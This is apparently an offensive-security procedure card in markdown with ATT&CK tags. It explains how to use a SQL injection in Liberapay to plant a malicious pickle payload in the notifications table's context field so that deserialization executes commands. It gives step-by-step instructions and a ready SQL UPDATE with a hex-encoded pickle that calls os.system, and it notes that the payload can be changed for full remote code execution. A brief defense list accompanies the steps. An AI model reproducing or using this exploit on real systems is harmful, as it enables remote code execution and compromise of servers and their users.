---
tags:
  - sqli
  - pickle-injection
  - deserialization
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/update-notifications-context-with-malicious-pickle]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: d02f3214-3f58-4265-ad10-8ae11fd2f804
created_at: '2025-12-14T03:46:19.793Z'
updated_at: '2025-12-14T03:46:19.793Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Malicious-Pickle-Payload-via-SQL-Injection

## Summary

This procedure exploits a SQL injection vulnerability to inject a malicious pickle payload into the notifications table's context field, enabling RCE upon deserialization.

## Description

Assuming a SQLi in inputs affecting notifications (e.g., team names or invite forms), update the context field with a hex-encoded pickle payload that constructs objects leading to os.system execution. The payload deserializes to run commands like 'sleep 500000', but can be modified for full RCE. This escalates SQLi impact in liberapay/utils/__init__.py's deserialize function.

## Requirements

1. SQL injection vector in Liberapay inputs
2. Knowledge of notification ID (from Step 1)
3. PostgreSQL access or injection capability

## Defense

Defensive measures and detection strategies:

- Parameterize all SQL queries to prevent injection
- Validate serialized data integrity (e.g., signatures)
- Audit database updates to sensitive fields like context

## Objectives

1. Overwrite notification context with malicious pickle
2. Ensure payload executes on deserialization
3. Escalate to RCE without direct deserialization access

## Instructions

### Step 1: Identify Injection Point

**Context**: Locate SQLi in team invite or related forms.

No command; review source or fuzz inputs.

> Confirm blind or error-based SQLi affecting notifications.

### Step 2: Execute Payload Injection

**Context**: Update the specific notification's context using the crafted payload.

**Command** ([[commands/update-notifications-context-with-malicious-pickle]]):
```sql
UPDATE notifications SET context = E'\x80027d710028580400000061736432710158030000006c6f6c71025801000000627103580500000033303030307104580100000063710563706f7369780a73797374656d0a7106580c000000736c656570203530303030307107857108527109752e' WHERE id = 43;
```

> This hex payload represents a pickled object invoking os.system('sleep 500000'); update succeeds if SQLi allows.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/update-notifications-context-with-malicious-pickle]]

## Tools Used


## Tags

- [[sqli]]
- [[pickle-injection]]
- [[deserialization]]
